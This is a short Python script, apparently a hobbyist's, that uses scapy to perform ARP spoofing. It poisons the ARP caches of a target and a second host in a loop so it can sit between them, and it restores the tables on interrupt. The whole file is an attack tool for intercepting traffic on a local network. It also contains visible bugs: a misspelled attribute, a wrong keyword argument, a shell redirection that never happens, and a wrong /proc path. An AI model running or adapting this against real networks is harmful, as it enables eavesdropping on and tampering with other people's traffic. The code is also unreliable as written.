from datetime import time
import scapy.all as scapy
import subprocess
import time

from scapy.packet import Packet



def get_mac(ip):    #NEED TO LOOK!
    arp_request=scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrcc




def arp(target_ip):
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=get_mac(target_ip))
    scapy.send(packet,verbose=False)



def spoof(target_ip,spoof_ip):
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=get_mac(target_ip),psrc=spoof_ip)
    scapy.send(packet , Verbose=False)

def restore(destination_ip,src_ip):
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=get_mac(destination_ip),psrc=src_ip,hwsrc=get_mac(src_ip))
    subprocess.call(["echo","0",">/proc/sys/ipv4/ip_forward"])
    scapy.send(packet,Verbose=False)
n=int(input("Press 1 if you want to spoof else press 0"))

target_ip=input("Enter the target ip")
spoof_ip=input("Enter spoof ip")
subprocess.call(["echo" ,"1", ">/proc/sys/net/ipv4/ip_forward"])
if n==1:
    count=2
    while True:
        try:
            spoof(target_ip,spoof_ip)
            spoof(spoof_ip,target_ip)
            print("[-] packets sent:" + str(count) , end="")
            count+=2
            time.sleep(2)
        except KeyboardInterrupt:
            print("restoring....")
            time.sleep(1)
            restore(target_ip,spoof_ip)
            restore(spoof_ip,target_ip)
elif n==0:
    arp(target_ip)
